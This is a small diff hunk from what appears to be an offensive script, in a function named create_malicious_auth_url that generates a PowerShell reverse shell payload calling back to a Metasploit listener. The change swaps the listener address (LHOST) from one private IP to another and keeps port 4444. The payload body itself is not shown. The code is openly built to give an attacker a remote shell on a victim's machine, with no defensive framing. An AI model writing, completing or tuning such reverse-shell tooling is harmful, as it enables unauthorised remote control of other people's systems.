@@ -30,7 +30,7 @@ def create_malicious_auth_url():
     Generate reverse shell payload that connects to Metasploit
     """
     # Your Metasploit listener details
-    LHOST = "192.168.204.133"  # Your machine's IP
+    LHOST = "192.168.183.85"  # Your machine's IP
     LPORT = "4444"               # Metasploit listener port
     
     # PowerShell reverse shell payload
